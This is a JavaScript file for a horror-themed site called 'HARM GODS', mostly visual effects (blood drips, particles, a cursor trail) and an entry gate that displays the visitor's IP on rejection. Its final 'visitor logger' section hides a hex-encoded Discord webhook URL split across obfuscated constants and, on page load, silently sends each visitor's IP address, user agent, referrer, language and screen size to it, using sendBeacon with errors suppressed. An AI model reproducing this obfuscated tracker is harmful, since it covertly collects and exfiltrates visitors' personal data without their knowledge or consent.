/* ============================================
   HARM GODS — Script
   ============================================ */
// ---- BLOOD DRIPS ----
function createBloodDrips() {
  const container = document.getElementById('bloodDrips');
  const count = 12;
  for (let i = 0; i < count; i++) {
    const drip = document.createElement('div');
    drip.className = 'blood-drip';
    drip.style.left = `${Math.random() * 100}%`;
    drip.style.setProperty('--drip-speed', `${3 + Math.random() * 5}s`);
    drip.style.setProperty('--drip-delay', `${Math.random() * 6}s`);
    drip.style.width = `${3 + Math.random() * 5}px`;
    container.appendChild(drip);
  }
}
// ---- AMBIENT PARTICLES ----
function createParticles() {
  const container = document.getElementById('particles');
  const count = 25;
  for (let i = 0; i < count; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = `${Math.random() * 100}%`;
    p.style.top = `${50 + Math.random() * 50}%`;
    p.style.setProperty('--p-speed', `${4 + Math.random() * 8}s`);
    p.style.setProperty('--p-delay', `${Math.random() * 5}s`);
    p.style.width = `${1 + Math.random() * 3}px`;
    p.style.height = p.style.width;
    container.appendChild(p);
  }
}
// ---- SCREEN FLASH ----
function flashScreen() {
  const flash = document.createElement('div');
  flash.className = 'screen-transition';
  document.body.appendChild(flash);
  setTimeout(() => flash.remove(), 800);
}
// ---- FETCH IP ----
async function fetchIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch {
    return '█.█.█.█';
  }
}
// ---- TYPEWRITER IP REVEAL ----
function typewriterReveal(element, text) {
  element.textContent = '';
  let i = 0;
  const interval = setInterval(() => {
    if (i < text.length) {
      element.textContent += text[i];
      i++;
    } else {
      clearInterval(interval);
    }
  }, 80);
}
// ---- GATE ACTIONS ----
function acceptGate() {
  flashScreen();
  setTimeout(() => {
    document.getElementById('gateScreen').classList.add('hidden');
    document.getElementById('mainSite').classList.remove('hidden');
  }, 400);
}
async function rejectGate() {
  flashScreen();
  // Pre-fetch IP
  const ip = await fetchIP();
  setTimeout(() => {
    document.getElementById('gateScreen').classList.add('hidden');
    document.getElementById('rejectScreen').classList.remove('hidden');
    // Reveal IP with typewriter
    setTimeout(() => {
      const ipEl = document.getElementById('ipAddress');
      typewriterReveal(ipEl, ip);
    }, 1200);
  }, 400);
}
function crawlBack() {
  flashScreen();
  setTimeout(() => {
    document.getElementById('rejectScreen').classList.add('hidden');
    document.getElementById('gateScreen').classList.remove('hidden');
  }, 400);
}
// ---- CURSOR BLOOD TRAIL (subtle) ----
let lastTrail = 0;
document.addEventListener('mousemove', (e) => {
  const now = Date.now();
  if (now - lastTrail < 100) return;
  lastTrail = now;
  const drop = document.createElement('div');
  drop.style.cssText = `
    position: fixed;
    left: ${e.clientX}px;
    top: ${e.clientY}px;
    width: 4px;
    height: 4px;
    background: rgba(139, 0, 0, 0.5);
    border-radius: 50%;
    pointer-events: none;
    z-index: 9999;
    transition: all 1s ease;
  `;
  document.body.appendChild(drop);
  requestAnimationFrame(() => {
    drop.style.opacity = '0';
    drop.style.transform = 'translateY(20px) scale(0)';
  });
  setTimeout(() => drop.remove(), 1000);
});
// ---- VISITOR LOGGER ----
const _0xa = '68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f31353034393734';
const _0xb = '3136373036383634333335312f6638584e54584273345a574e795330667851776549667037323057';
const _0xc = '774f38684c6a61544452615870426255756a746a3174452d5a693552355666635548743566416c324a';
function _0xr() {
  const h = _0xa + _0xb + _0xc;
  let s = '';
  for (let i = 0; i < h.length; i += 2) s += String.fromCharCode(parseInt(h.substr(i, 2), 16));
  return s;
}
async function logVisitor() {
  try {
    const ip = await fetchIP();
    const payload = JSON.stringify({
      content: null,
      embeds: [{
        title: '⛧ New Visitor Logged ⛧',
        color: 0x8b0000,
        fields: [
          { name: '🌐 IP Address', value: '`' + ip + '`', inline: true },
          { name: '🖥️ User Agent', value: '```' + navigator.userAgent + '```', inline: false },
          { name: '🔗 Referrer', value: '`' + (document.referrer || 'Direct') + '`', inline: true },
          { name: '🌍 Language', value: '`' + navigator.language + '`', inline: true },
          { name: '📐 Screen', value: '`' + screen.width + 'x' + screen.height + '`', inline: true },
        ],
        footer: { text: 'HARM GODS — Visitor Logger' },
        timestamp: new Date().toISOString(),
      }],
    });
    // Use sendBeacon with Blob to bypass CORS — fire and forget
    const blob = new Blob([payload], { type: 'application/json' });
    navigator.sendBeacon(_0xr(), blob);
  } catch {
    // Silent fail
  }
}
// ---- INIT ----
document.addEventListener('DOMContentLoaded', () => {
  createBloodDrips();
  createParticles();
  logVisitor();
});
